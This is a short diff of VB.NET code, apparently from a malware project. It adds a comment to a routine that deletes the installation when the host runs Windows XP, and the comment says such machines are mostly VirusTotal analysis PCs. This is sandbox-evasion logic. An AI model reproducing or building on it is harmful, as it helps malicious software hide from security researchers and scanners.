@@ -46,7 +46,7 @@ Module Func
         End If
     End Sub
 
-    Sub Win_XP()
+    Sub Win_XP() '90% of XP machines are virustotal PCs
         If ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
             Installation.DEL()
         End If
